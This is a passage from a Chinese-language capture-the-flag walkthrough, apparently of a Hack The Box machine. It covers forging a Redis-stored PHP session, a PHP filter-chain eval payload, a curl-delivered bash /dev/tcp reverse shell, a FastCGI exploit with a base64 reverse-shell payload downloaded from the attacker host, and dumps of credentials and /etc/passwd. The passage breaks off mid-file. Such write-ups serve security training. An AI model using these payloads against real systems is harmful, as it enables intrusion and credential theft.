class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><code>../../developers/bootstrap.php</code>的内容如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.save_handler&#x27;</span>, <span class="string">&#x27;redis&#x27;</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;session.save_path&#x27;</span>, <span class="string">&#x27;tcp://localhost:6379/?auth=COLLECTR3D1SPASS&#x27;</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br></pre></td></tr></table></figure><p>看来<code>developer.collect.htb</code>的Session是用redis保存的</p><p>更改自己的Session的<code>auth</code>变量为<code>True</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 10.10.11.192 -a COLLECTR3D1SPASS <span class="built_in">set</span> PHPREDIS_SESSION:Bufferfly <span class="string">&quot;username|s:9:\&quot;Bufferfly\&quot;;auth|s:4:\&quot;True\&quot;;&quot;</span></span><br></pre></td></tr></table></figure><blockquote><p><code>collect.htb</code>的Session同样使用Redis存储，但是存储内容为<code>&quot;username|s:9:\&quot;Bufferfly\&quot;;role|s:5:\&quot;admin\&quot;;&quot;</code>，没有auth变量，无法用于<code>developers.collect.htb</code></p></blockquote><p>使用Session访问<code>http://developers.collect.htb/?page=home</code></p><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure><p>构造Payload并进行反弹Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python php_filter_chain_generator.py --chain <span class="string">&#x27;&lt;?php @eval($_GET[&quot;BFL&quot;]);?&gt;     &#x27;</span></span><br><span class="line">curl <span class="string">&#x27;http://developers.collect.htb/?page=$PAYLOAD&amp;BFL=system(&quot;bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.*.*%2F9998%200%3E%261%27&quot;);&#x27;</span>  -H <span class="string">&quot;Authorization: Basic ZGV2ZWxvcGVyc19ncm91cDpyMGNrZXQ=&quot;</span> -H <span class="string">&quot;Cookie: PHPSESSID=Bufferfly&quot;</span></span><br></pre></td></tr></table></figure><p>查看<code>/etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:101:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:102:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:103:109:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:104:110::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:105:111:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">avahi-autoipd:x:106:115:Avahi autoip daemon,,,:&#x2F;var&#x2F;lib&#x2F;avahi-autoipd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">usbmux:x:107:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">rtkit:x:108:116:RealtimeKit,,,:&#x2F;proc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:109:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">dnsmasq:x:110:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">avahi:x:111:117:Avahi mDNS daemon,,,:&#x2F;run&#x2F;avahi-daemon:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">speech-dispatcher:x:112:29:Speech Dispatcher,,,:&#x2F;run&#x2F;speech-dispatcher:&#x2F;bin&#x2F;false</span><br><span class="line">pulse:x:113:119:PulseAudio daemon,,,:&#x2F;run&#x2F;pulse:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">saned:x:114:122::&#x2F;var&#x2F;lib&#x2F;saned:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">colord:x:115:123:colord colour management daemon,,,:&#x2F;var&#x2F;lib&#x2F;colord:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">geoclue:x:116:124::&#x2F;var&#x2F;lib&#x2F;geoclue:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">Debian-gdm:x:117:125:Gnome Display Manager:&#x2F;var&#x2F;lib&#x2F;gdm3:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:118:126:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">victor:x:1002:1002::&#x2F;home&#x2F;victor:&#x2F;bin&#x2F;bash</span><br><span class="line">vboxadd:x:998:1::&#x2F;var&#x2F;run&#x2F;vboxadd:&#x2F;bin&#x2F;false</span><br><span class="line">redis:x:119:127::&#x2F;var&#x2F;lib&#x2F;redis:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:997:997::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>查看<code>/var/www/developers/login.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/www/developers/login.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;./bootstrap.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;auth&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;auth&#x27;</span>] == <span class="literal">True</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(header(<span class="string">&quot;Location: /&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysqli(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;webapp_user&quot;</span>, <span class="string">&quot;Str0ngP4ssw0rdB*12@1&quot;</span>, <span class="string">&quot;developers&quot;</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;set_charset(<span class="string">&#x27;utf8mb4&#x27;</span>);</span><br><span class="line"><span class="variable">$db</span>-&gt;options(MYSQLI_OPT_INT_AND_FLOAT_NATIVE, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;prepare(<span class="string">&quot;SELECT * FROM users where username=?&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_object();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span> &amp;&amp; <span class="variable">$row</span>-&gt;username == <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$row</span>-&gt;password == md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;auth&#x27;</span>] = <span class="literal">True</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(header(<span class="string">&#x27;Location: /&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到Mysql服务凭证<code>webapp_user:Str0ngP4ssw0rdB*12@1</code></p><p>查看本地服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -antlp | grep 127.0.0.1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -</span><br></pre></td></tr></table></figure><p>查看Victor的进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -auxwww | grep victor</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victor      1119  0.0  0.5 265840 21416 ?        S    Mar31   0:00 php-fpm: pool victor</span><br><span class="line">victor      1120  0.0  0.5 265840 21664 ?        S    Mar31   0:00 php-fpm: pool victor</span><br></pre></td></tr></table></figure><p>9000端口疑似为FastCGI，3000端口根据之前的HTTP记录可以得知为API</p><blockquote><p><a href="https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi">https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi</a></p></blockquote><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9997</span><br></pre></td></tr></table></figure><p>构造shell脚本，替换部分内容如下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PAYLOAD=<span class="string">&quot;&lt;?php echo &#x27;&lt;!--&#x27;; system(&#x27;echo -n <span class="variable">$PYTHON_REVERSE_SHELL_PAYLOAD_BASE64_ENCODED</span> | base64 -d | bash &#x27;); echo &#x27;--&gt;&#x27;;&quot;</span></span><br><span class="line">FILENAMES=<span class="string">&quot;/tmp/bfl.php&quot;</span> <span class="comment"># Exisiting file path</span></span><br></pre></td></tr></table></figure><p>开启HTTP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 80</span><br></pre></td></tr></table></figure><p>获取shell脚本并执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch /tmp/bfl.php</span><br><span class="line">curl http://10.10.*.*/bfl.sh -o /tmp/bfl.sh</span><br><span class="line">bash /tmp/bfl.sh &amp;</span><br></pre></td></tr></table></figure><p>获得反弹Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/victor/user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">88ca55f71209346e09d9612d70defd95</span><br></pre></td></tr></table></figure><h2 id="权限提升-30"><a class="markdownIt-Anchor" href="#权限提升-30"></a> 权限提升</h2><p>用户victor的Home路径下有一份pollution_api的源码</p><p>查看服务进程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -auxwww | grep index.js</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root        1325  0.0  1.9 1681764 79172 ?       Sl   Mar31   0:02 &#x2F;usr&#x2F;bin&#x2F;node &#x2F;root&#x2F;pollution_api&#x2F;index.js</span><br></pre></td></tr></table></figure><p>基本确定提权是要利用Node.Js服务的漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/victor/pollution_api/index.js</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Ok&quot;</span>, <span class="attr">Message</span>: <span class="string">&#x27;Read documentation from api in /documentation&#x27;</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="string">&#x27;/auth&#x27;</span>,<span class="built_in">require</span>(<span class="string">&#x27;./routes/auth&#x27;</span>));</span><br><span class="line">app.use(<span class="string">&#x27;/client&#x27;</span>,<span class="built_in">require</span>(<span class="string">&#x27;./routes/client&#x27;</span>));</span><br><span class="line">app.use(<span class="string">&#x27;/admin&#x27;</span>,<span class="built_in">require</span>(<span class="string">&#x27;./routes/admin&#x27;</span>));</span><br><span class="line">app.use(<span class="string">&#x27;/documentation&#x27;</span>,<span class="built_in">require</span>(<span class="string">&#x27;./routes/documentation&#x27;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;Listen on http://localhost:3000&#x27;</span>);</span><br></pre></td></tr></table></figure><p>查看<code>/home/victor/pollution_api/routes/auth.js</code></p><p>此部分与登录相关</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/victor/pollution_api/routes/auth.js</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> User = <span class="built_in">require</span>(<span class="string">&#x27;../models/User&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> &#123; signtoken &#125; = <span class="built_in">require</span>(<span class="string">&#x27;../functions/jwt&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> &#123; exec &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/register&#x27;</span>, <span class="keyword">async</span> (req,res)=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.body.username != <span class="literal">null</span> &amp;&amp; req.body.password != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> find = <span class="keyword">await</span> User.findAll(&#123;<span class="attr">where</span>: &#123;<span class="attr">username</span>: req.body.username&#125;&#125;)</span><br><span class="line">            <span class="keyword">if</span>(find.length == <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">                User.create(&#123;</span><br><span class="line">                    username: req.body.username,</span><br><span class="line">                    password: req.body.password,</span><br><span class="line">                    role: <span class="string">&quot;user&quot;</span></span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">                exec(<span class="string">&#x27;/home/victor/pollution_api/log.sh log_register&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Ok&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;This user already exists&quot;</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Parameters not found&quot;</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">async</span> (req,res)=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(req.body.username != <span class="literal">null</span> &amp;&amp; req.body.password != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> find = <span class="keyword">await</span> User.findAll(&#123;<span class="attr">where</span>: &#123;<span class="attr">username</span>: req.body.username, <span class="attr">password</span>: req.body.password&#125;&#125;);</span><br><span class="line">            <span class="keyword">if</span>(find.length &gt; <span class="number">0</span>)&#123;</span><br><span class="line"></span><br><span class="line">                exec(<span class="string">&#x27;/home/victor/pollution_api/log.sh log_login&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">const</span> token = signtoken(&#123;<span class="attr">user</span>: find[<span class="number">0</span>].username, <span class="attr">is_auth</span>: <span class="literal">true</span>, <span class="attr">role</span>: find[<span class="number">0</span>].role&#125;);</span><br><span class="line">                <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">                    Status: <span class="string">&quot;Ok&quot;</span>,</span><br><span class="line">                    Header: &#123;</span><br><span class="line">                        <span class="string">&quot;x-access-token&quot;</span>: token</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>, <span class="attr">Message</span>: <span class="string">&quot;Invalid Credentials&quot;</span>&#125;);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Error&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.json(&#123;<span class="attr">Status</span>: <span class="string">&quot;Parameters not found&quot;</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>进入路径<code>/home/victor/pollution_api/model</code>，可以看到一个<code>db.js</code></p><p>查看<code>/home/victor/pollution_api/model/db.js</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/victor/pollution_api/model/db.js</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Sequelize = <span class="built_in">require</span>(<span class="string">&#x27;sequelize&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sequelize = <span class="keyword">new</span> Sequelize(<span class="string">&#x27;pollution_api&#x27;</span>,<span class="string">&#x27;webapp_user&#x27;</span>,<span class="string">&#x27;Str0ngP4ssw0rdB*12@1&#x27;</span>,&#123;</span><br><span class="line">    host: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">    dialect: <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">    define: &#123;</span><br><span class="line">        charset: <span class="string">&#x27;utf8&#x27;</span>,</span><br><span class="line">        collate: <span class="string">&#x27;utf8_general_ci&#x27;</span>,</span><br><span class="line">        timestamps: <span class="literal">true</span></span><br><span class="line">    &#125;,</span><br><span class="line">    logging: <span class="literal">false</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123; Sequelize, sequelize &#125;;</span><br></pre></td></tr></table></figure><p>该服务的账户存储于Mysql中</p><p>查看<code>/home/victor/pollution_api/routes/admin.js</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/victor/pollution_api/routes/admin.js</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> router = express.Router();</span><br><span class="line"><span class="keyword">const</span> User = <span 